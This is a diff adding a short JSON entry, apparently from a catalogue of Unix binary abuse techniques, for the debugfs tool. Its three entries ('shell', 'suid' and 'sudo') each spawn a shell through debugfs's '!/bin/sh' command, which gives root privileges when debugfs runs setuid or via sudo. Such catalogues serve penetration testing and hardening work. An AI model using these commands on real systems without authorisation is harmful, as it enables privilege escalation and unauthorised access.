@@ -1,0 +1,19 @@
+{
+  "functions": {
+    "shell": [
+      {
+        "code": "debugfs\n!/bin/sh\n"
+      }
+    ],
+    "suid": [
+      {
+        "code": "./debugfs\n!/bin/sh\n"
+      }
+    ],
+    "sudo": [
+      {
+        "code": "sudo debugfs\n!/bin/sh\n"
+      }
+    ]
+  }
+}
